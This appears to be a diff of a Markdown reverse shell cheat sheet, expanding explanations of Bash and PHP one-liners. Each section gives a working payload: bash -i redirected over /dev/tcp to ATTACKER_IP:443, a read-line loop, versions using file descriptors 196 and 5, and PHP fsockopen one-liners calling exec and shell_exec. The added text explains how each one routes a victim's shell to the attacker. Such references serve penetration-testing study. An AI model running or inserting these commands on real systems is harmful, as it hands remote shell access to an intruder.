@@ -260,41 +260,122 @@ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
 This command launches an interactive Bash shell (`-i`), then uses redirection to send both standard output and standard error to a TCP socket connected to `ATTACKER_IP` on port `443`. `>&` is used to redirect both stdout and stderr, and `0>&1` connects standard input from the same source.
 
 ---
-
 ### Bash Read Line Reverse Shell
 ```bash
 exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
 ```
-Creates a bidirectional connection on file descriptor 5 to the attacker's IP. It reads lines from the socket and executes each as a command, sending both stdout and stderr back to the attacker via the same connection.
+This is a reverse shell written in Bash using built-in TCP support (`/dev/tcp/...`). When run on a target machine, it connects to a remote attacker’s IP and port (in this case, `ATTACKER_IP` on port `443`) and allows the attacker to send commands to be executed on the victim's system.
+
+`exec 5<>/dev/tcp/ATTACKER_IP/443`
+- `exec 5<>` opens file descriptor 5 for both reading and writing (`<>`) to the TCP connection at `/dev/tcp/ATTACKER_IP/443`.
+- This establishes a connection to the attacker's listener at `IP:port`.
+- File descriptor 5 now acts like a network socket.
+
+*Think of `/dev/tcp/host/port` as a special Bash feature that allows network I/O using shell redirection.*
+
+`cat <&5`
+- Reads input from file descriptor 5 (i.e., from the attacker).
+- This is the incoming stream of commands from the attacker.
+
+`| while read line; do ... done`
+- Pipes the attacker's input into a loop.
+- The loop:
+   - Reads each line (command) from the attacker.
+   - Stores it in the variable line.
+   - Executes that line as a command.
+
+`do $line 2>&5 >&5`
+- `$line` is the actual command received from the attacker.
+- `2>&5`  sends stderr (error output) to file descriptor 5 (the network).
+- `>&5`   sends stdout (normal output) to file descriptor 5.
+- So, both output types are sent back to the attacker's listener.
 
 ---
-
 ### Bash With File Descriptor 196 Reverse Shell
 ```bash
 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
 ```
-Uses file descriptor `196` to establish a socket connection. Then redirects stdin, stdout, and stderr through this descriptor to create a bidirectional communication channel.
+ **High-Level Purpose:**
+This command:
+- Establishes a reverse TCP connection to an attacker's listener using a custom file descriptor (`196`),
+- Then uses that connection to launch an interactive shell (`sh`),
+- Redirects input, output, and errors through that same TCP connection
+
+`0<&196`
+- This tells Bash to read from file descriptor 196 and assign it to standard input (`0`).
+- At this point, `196` hasn't been opened yet—so this part does nothing meaningful right now, but it’s preparing for the connection.
+
+`exec 196<>/dev/tcp/ATTACKER_IP/443`
+- This is the actual connection step.
+- `exec 196<>` opens file descriptor `196` for both reading and writing (`<>`).
+- `/dev/tcp/...` is a Bash feature that lets you interact with network sockets like files.
+- So this line establishes a TCP connection to the attacker's machine.
+
+`sh <&196 >&196 2>&196`
+- This runs a new shell (`sh`) and:
+- `<&196`: Reads commands from the attacker (file descriptor 196 → standard input),
+- `>&196`: Sends stdout (output) to the attacker,
+- `2>&196`: Sends stderr (errors) to the attacker.
+Together, this makes the shell fully interactive over the network. The attacker can type commands and receive both output and errors back, like a remote terminal.
 
 ---
-
 ### Bash With File Descriptor 5 Reverse Shell
 ```bash
 bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
 ```
-Creates an interactive Bash shell that connects via file descriptor 5. Redirects all I/O (input, output, error) to communicate over a TCP connection with the attacker.
+This command creates an interactive reverse shell using Bash and file descriptor 5, sending input/output to the attacker's IP and port (usually where a Netcat or Ncat listener is waiting).
+
+`bash -i`
+- Starts an interactive Bash shell (`-i` = interactive).
+- This allows for command history, prompts, job control, etc., like a normal terminal session.
+
+`5<> /dev/tcp/ATTACKER_IP/443`
+- Opens file descriptor 5 to read and write (`<>`) to a TCP connection with the attacker.
+- Bash's special `/dev/tcp/` feature lets you treat network connections like files.
+
+*🔗 This essentially says: “Connect to the attacker’s IP on port 443, and treat that connection as file descriptor 5.”*
+
+`0<&5`
+- Redirects stdin (`0`) to come from fd `5`.
+- → So, input comes from the attacker's socket.
+
+`1>&5`
+- Redirects stdout (`1`) to go to fd `5`.
+- → So, output of commands is sent back to the attacker.
+
+`2>&5`
+- Redirects stderr (`2`) (errors) to go to fd `5` too.
+- → So, any errors are also sent back to the attacker.
 
 ---
-
 ## PHP
 
 ### PHP Reverse Shell Using the `exec` Function
 ```bash
 php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
 ```
-Creates a TCP connection to the attacker’s IP on port 443 using `fsockopen`, then executes a shell with input/output redirected to the socket using `exec()`.
+**What It Does:**
+
+This one-liner:
+- Uses PHP to connect to a remote attacker’s machine (via TCP),
+- Then launches a shell (sh) and routes all input/output/error through that connection.
+
+`php -r '...'`
+- The `-r` flag tells PHP to run the code provided in quotes directly (no need for a separate `.php` file)
+
+`$sock = fsockopen("ATTACKER_IP", 443);`
+- Opens a TCP connection to the attacker's IP and port 443 using `fsockopen()`.
+- Returns a stream socket, which becomes file descriptor 3 by default in PHP when you open a resource like this.
+
+`exec("sh <&3 >&3 2>&3");`
+- Executes a new shell (`sh`) on the victim's system.
+- This shell:
+   - Reads input from fd 3 (`<&3`) — the attacker's socket.
+   - Sends output to fd 3 (`>&3`) — so the attacker sees the results.
+   - Sends errors to fd 3 too (`2>&3`) — to ensure complete interaction.
+So the attacker can type commands remotely, and see the shell's output, just like a terminal session.
 
 ---
-
 ### PHP Reverse Shell Using the `shell_exec` Function
 ```bash
 php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
